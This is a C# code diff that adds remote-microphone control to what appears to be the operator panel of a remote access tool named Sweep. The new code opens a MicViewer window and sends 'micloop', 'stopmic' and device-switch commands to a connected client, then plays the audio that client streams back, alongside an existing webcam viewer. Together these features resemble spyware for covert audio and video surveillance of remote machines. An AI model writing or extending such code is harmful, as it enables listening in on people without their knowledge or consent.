@@ -23,6 +23,7 @@ namespace Sweep.Services
         private WebcamViewer webcamViewer;
         private string previousid = string.Empty;
         private Sweep.Forms.Sweep _sweepform;
+        private MicViewer micViewer;
 
         // Audio playback components
         private WaveOutEvent waveOut;
@@ -282,6 +283,57 @@ namespace Sweep.Services
 
         private async Task HandleMicAudioAsync(JObject meta, string clientId, byte[] audioBytes)
         {
+            var ctrl = _listView;
+            if (micViewer == null || micViewer.IsDisposed || clientId != previousid)
+            {
+                void CreateForm()
+                {
+                    micViewer = new MicViewer();
+                    micViewer.SetMonitors((int)meta["microphones"]);
+
+                    micViewer.Mic += async (bool y) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = y ? "micloop" : "stopmic",
+                        }.ToString());
+                    };
+
+                    micViewer.DeviceChanged += async (int y) =>
+                    {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "stopmic",
+                        }.ToString());
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "mic",
+                            ["idx"] = y
+                        }.ToString());
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "micloop",
+                        }.ToString());
+                    };
+
+                    micViewer.MicClosing += async () => {
+                        await _server.SendMessageToClient(clientId, new JObject
+                        {
+                            ["command"] = "stopmic",
+                        }.ToString());
+                    };
+
+                    micViewer.Show();
+                }
+
+                if (ctrl.InvokeRequired)
+                    ctrl.Invoke((Action)CreateForm);
+                else
+                    CreateForm();
+            }
+
+            previousid = clientId;
+
             try
             {
                 if (waveOut == null || bufferedProvider == null)
